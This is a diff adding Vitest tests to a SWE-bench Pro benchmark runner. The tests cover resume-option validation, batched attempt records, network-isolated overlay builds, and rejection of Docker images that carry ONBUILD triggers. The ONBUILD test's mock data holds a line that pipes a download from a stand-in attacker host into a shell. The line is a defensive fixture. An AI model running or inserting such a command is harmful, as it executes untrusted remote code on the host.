@@ -15,11 +15,14 @@ import type { SwebenchProContainerPolicy } from '../../bench/src/suites/swebench
 import { classifyOutcome } from '../../bench/src/suites/swebench-pro/state.js';
 import {
   hasCompleteProVerifierReceipt,
+  assertExplicitResumeOptions,
+  attemptOrdinalTracker,
   cleanupProRuntimeHomes,
   isRunFatalTransportFailure,
   ownedRunContainerIds,
   reclamationContainerName,
   reclamationNamespaceSnapshot,
+  recordCompletedAttempt,
   retainVerifierBindingsAfterRedo,
 } from '../../bench/src/suites/swebench-pro/runner.js';
 import {
@@ -114,6 +117,43 @@ describe('SWE-bench Pro adapter parsing', () => {
       runId: 'pilot1', resume: true, redo: ['owner/repo::a'], taskIds: ['owner/repo'],
     });
     expect(() => swebenchProAdapter.commands.run.parse(['--run-id', 'pilot1', '--unknown'])).toThrow(/unknown option/);
+  });
+
+  it('rejects explicit resume count or seed drift from the immutable manifest', () => {
+    const manifest = {
+      experiment: {
+        model: 'gpt-test', requestedEffort: 'high', arm: 'both', taskIds: ['one', 'two'],
+      },
+      limits: { taskConcurrency: 1, hostTaskTimeoutMs: 60_000 },
+      suiteConfig: { selection: { seed: 7 } },
+    } as never;
+    const options = {
+      model: undefined, requestedEffort: undefined, arm: undefined, taskConcurrency: undefined,
+      sessionTimeoutMs: undefined, taskIds: undefined, count: 2, seed: 7,
+    } as never;
+    expect(() => assertExplicitResumeOptions(options, manifest)).not.toThrow();
+    expect(() => assertExplicitResumeOptions({ ...options, count: 1 }, manifest)).toThrow(/--count/);
+    expect(() => assertExplicitResumeOptions({ ...options, seed: 8 }, manifest)).toThrow(/--seed/);
+  });
+
+  it('batches paired attempt records through the append-only state path', async () => {
+    const appendAttempts = vi.fn(async () => 2);
+    const nextOrdinal = attemptOrdinalTracker({
+      attempts: [{ taskId: 'task', arm: 'a', ordinal: 3 }],
+    } as never);
+    await recordCompletedAttempt({ appendAttempts } as never, '11111111-1111-4111-8111-111111111111', {
+      taskId: 'task', arm: 'a', nativeRoot: 'native/tasks/task/a',
+    } as never, {
+      schemaVersion: 2, phase: 'session-done', failure: null, annotations: [],
+    }, {
+      codexExit: 0, startedAt: 10, endedAt: 12, baseSha: 'a', expectedBase: 'a', patchBytes: 0,
+      applyCheck: null, ucRuns: [], waitedForTerminalMs: 500, failure: null,
+    }, nextOrdinal);
+    expect(appendAttempts).toHaveBeenCalledOnce();
+    expect(appendAttempts).toHaveBeenCalledWith(null, [
+      expect.objectContaining({ ordinal: 4, phase: 'session' }),
+      expect.objectContaining({ ordinal: 5, phase: 'detached-wait' }),
+    ]);
   });
 
   it('invalidates every native result in an affected evaluator arm on redo', () => {
@@ -360,6 +400,33 @@ describe('evaluator ownership and empty predictions', () => {
     })).toEqual(['a'.repeat(64)]);
   });
 
+  it('rejects inherited ONBUILD triggers before invoking an offline overlay build', async () => {
+    const instance = instanceFromRow(row('task-onbuild'));
+    const digest = `jefzda/sweap-images@sha256:${'a'.repeat(64)}`;
+    const calls: string[][] = [];
+    const docker = async (argv: readonly string[]): Promise<string> => {
+      calls.push([...argv]);
+      if (argv[0] === 'image' && argv[1] === 'inspect') {
+        return JSON.stringify([{
+          Id: `sha256:${'b'.repeat(64)}`,
+          RepoDigests: [digest],
+          Os: 'linux',
+          Architecture: 'amd64',
+          Config: { OnBuild: ['RUN curl https://attacker.invalid/payload | sh'] },
+        }]);
+      }
+      throw new Error(`unexpected Docker argv: ${argv.join(' ')}`);
+    };
+    await expect(prepareTaskImage(instance, {
+      roots: createBenchPathRoots(join(process.cwd(), 'bench')),
+      runId: 'run-onbuild',
+      toolchainDirectory: '/cache/toolchain',
+      toolchainPayloadSha256: 'd'.repeat(64),
+      docker,
+    })).rejects.toThrow(/ONBUILD/);
+    expect(calls.every((argv) => argv[0] !== 'build')).toBe(true);
+  });
+
   it('selects only the requested repository digest', () => {
     const digest = `jefzda/sweap-images@sha256:${'a'.repeat(64)}`;
     expect(repositoryDigest({ RepoDigests: [digest, `other/image@sha256:${'b'.repeat(64)}`] })).toBe(digest);
@@ -385,6 +452,7 @@ describe('evaluator ownership and empty predictions', () => {
             RepoDigests: [digest],
             Os: 'linux',
             Architecture: 'amd64',
+            Config: { OnBuild: null },
           }]);
         }
         return JSON.stringify([{
@@ -394,6 +462,7 @@ describe('evaluator ownership and empty predictions', () => {
           RepoDigests: reference === digest ? [digest] : [],
           Os: 'linux',
           Architecture: 'amd64',
+          Config: { OnBuild: null },
         }]);
       }
       throw new Error(`unexpected Docker argv: ${argv.join(' ')}`);
@@ -414,6 +483,7 @@ describe('evaluator ownership and empty predictions', () => {
       .toEqual([first.overlayName, second.overlayName]);
     expect(buildArgv[0]).toContain('ultracode.benchmark.run=run-one');
     expect(buildArgv[1]).toContain('ultracode.benchmark.run=run-two');
+    expect(buildArgv[0]).toContain('--network=none');
   });
 
   it('removes a run-owned overlay when post-build inspection fails', async () => {
@@ -435,6 +505,7 @@ describe('evaluator ownership and empty predictions', () => {
           RepoDigests: [digest],
           Os: 'linux',
           Architecture: 'amd64',
+          Config: { OnBuild: null },
         }]);
       }
       if (argv[0] === 'image' && argv[1] === 'rm') return '';
@@ -471,6 +542,7 @@ describe('evaluator ownership and empty predictions', () => {
           RepoDigests: [digest],
           Os: 'linux',
           Architecture: 'amd64',
+          Config: { OnBuild: null },
         }]);
       }
       if (argv[0] === 'image' && argv[1] === 'rm') return '';
